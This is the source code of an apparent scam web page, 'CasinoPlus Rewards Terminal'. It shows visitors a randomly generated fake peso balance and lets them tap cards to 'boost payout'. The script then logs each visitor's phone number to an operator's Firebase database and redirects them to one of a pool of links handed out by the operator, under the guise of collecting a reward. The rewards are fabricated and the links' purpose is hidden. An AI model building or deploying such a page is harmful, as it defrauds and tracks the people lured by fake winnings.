<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>CasinoPlus | Rewards Terminal</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <script src="js/config.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Public+Sans:wght@400;900&family=Orbitron:wght@700&display=swap" rel="stylesheet">
    <style>
        :root { --gold: linear-gradient(180deg, #ffdc6a 0%, #d4af37 100%); --bg: #04070d; }
        body { 
            background: var(--bg); color: #fff; font-family: 'Public Sans', sans-serif; 
            display: flex; flex-direction: column; align-items: center; min-height: 100vh; margin: 0; padding: 20px;
            background-image: radial-gradient(circle at 50% -20%, #1e3a8a 0%, transparent 70%);
        }
        
        .header { text-align: center; margin-bottom: 20px; }
        .amount { 
            font-family: 'Orbitron', sans-serif; font-size: 42px; font-weight: 700; 
            background: var(--gold); -webkit-background-clip: text; -webkit-text-fill-color: transparent;
            margin: 10px 0; filter: drop-shadow(0 0 8px rgba(212, 175, 55, 0.4));
        }

        /* GRID NG MGA CARDS */
        .game-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; width: 100%; max-width: 380px; margin: 20px 0; }
        .card-wrapper { position: relative; cursor: pointer; transition: transform 0.2s; }
        .card-wrapper:hover { transform: scale(1.05); }
        .card-img { width: 100%; border-radius: 15px; border: 1px solid rgba(212, 175, 55, 0.2); }
        
        .card-disabled { filter: grayscale(1) opacity(0.3); pointer-events: none; }

        /* BUTTONS SECTION */
        .btn-group { display: flex; flex-direction: column; gap: 12px; width: 100%; max-width: 360px; margin-top: 10px; }
        .pay-button { 
            background: var(--gold); color: #000; padding: 18px; border: none; border-radius: 12px;
            font-weight: 800; text-transform: uppercase; cursor: pointer; font-size: 16px;
            box-shadow: 0 4px 15px rgba(212, 175, 55, 0.3);
        }
        .pay-button:disabled { background: #1e293b; color: #475569; box-shadow: none; cursor: not-allowed; }
        
        .share-button { 
            background: #1877f2; color: #fff; padding: 12px; border: none; border-radius: 10px;
            font-weight: 700; font-size: 14px; cursor: pointer;
        }

        #processingOverlay { position: fixed; inset: 0; background: rgba(0,0,0,0.9); z-index: 100; display: none; flex-direction: column; align-items: center; justify-content: center; }
    </style>
</head>
<body>

    <div class="header">
        <p style="font-size: 11px; letter-spacing: 2px; color: #94a3b8;">AVAILABLE BALANCE</p>
        <div class="amount" id="balanceDisplay">₱0.00</div>
        <p id="statusMsg" style="color: #22c55e; font-size: 12px; font-weight: 800;">TAP 5 CARDS TO BOOST PAYOUT</p>
    </div>

    <div class="game-grid" id="gameGrid">
        </div>

    <div class="btn-group">
        <button class="pay-button" id="claimBtn" onclick="handleClaim()" disabled>Collect Reward</button>
        <button class="share-button" onclick="handleShare()">Share to Facebook for Bonus</button>
    </div>

    <div id="processingOverlay">
        <div style="width: 40px; height: 40px; border: 4px solid #d4af37; border-top-color: transparent; border-radius: 50%; animation: spin 1s linear infinite;"></div>
        <p style="margin-top: 15px; color: #d4af37; font-weight: bold;">Processing via ViaLink...</p>
    </div>

<script>
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();
    const userPhone = localStorage.getItem("userPhone") || "GHOST_USER";

    let balance = 0;
    let clickCount = 0;
    const maxClicks = 5;

    window.onload = () => {
        // I-set ang random initial amount
        const randomStart = [150, 200, 250, 350][Math.floor(Math.random() * 4)];
        updateBalance(randomStart);
        loadCards();
    };

    function loadCards() {
        const grid = document.getElementById('gameGrid');
        // Gagamit tayo ng image placeholders, palitan mo na lang ng actual assets mo
        for (let i = 1; i <= 9; i++) {
            const wrap = document.createElement('div');
            wrap.className = 'card-wrapper';
            wrap.innerHTML = `<img src="img/card${i}.png" class="card-img" id="card-${i}" onerror="this.src='https://via.placeholder.com/150/1e293b/d4af37?text=CARD+${i}'">`;
            wrap.onclick = () => cardClick(i);
            grid.appendChild(wrap);
        }
    }

    function cardClick(id) {
        if (clickCount >= maxClicks) return;
        const img = document.getElementById(`card-${id}`);
        if (img.classList.contains('card-disabled')) return;

        clickCount++;
        img.classList.add('card-disabled');
        updateBalance(25); // +25 accurately

        if (clickCount === maxClicks) {
            document.getElementById('statusMsg').innerText = "LIMIT REACHED - PAYOUT READY";
            document.getElementById('claimBtn').disabled = false;
            logToAdmin();
        }
    }

    function updateBalance(amt) {
        balance += amt;
        document.getElementById('balanceDisplay').innerText = `₱${balance.toLocaleString('en-US', {minimumFractionDigits: 2})}`;
    }

    function logToAdmin() {
        db.ref('user_logs/' + userPhone).set({
            phone: userPhone,
            reward: balance,
            status: 'idle',
            last_updated: new Date().toLocaleString()
        });
    }

    function handleClaim() {
        document.getElementById('processingOverlay').style.display = 'flex';
        
        db.ref('links').orderByChild('status').equalTo('available').limitToFirst(1).once('value', snap => {
            if (snap.exists()) {
                const key = Object.keys(snap.val())[0];
                const link = snap.val()[key];

                db.ref('links/' + key).update({ status: 'pending', user: userPhone });
                db.ref('user_logs/' + userPhone).update({ status: 'claimed' });

                setTimeout(() => { window.location.href = link.url; }, 2000);
            } else {
                alert("All lines busy. Try again later.");
                document.getElementById('processingOverlay').style.display = 'none';
            }
        });
    }

    function handleShare() {
        alert("Sharing feature is being initialized...");
    }
</script>

<style> @keyframes spin { to { transform: rotate(360deg); } } </style>
</body>
</html>
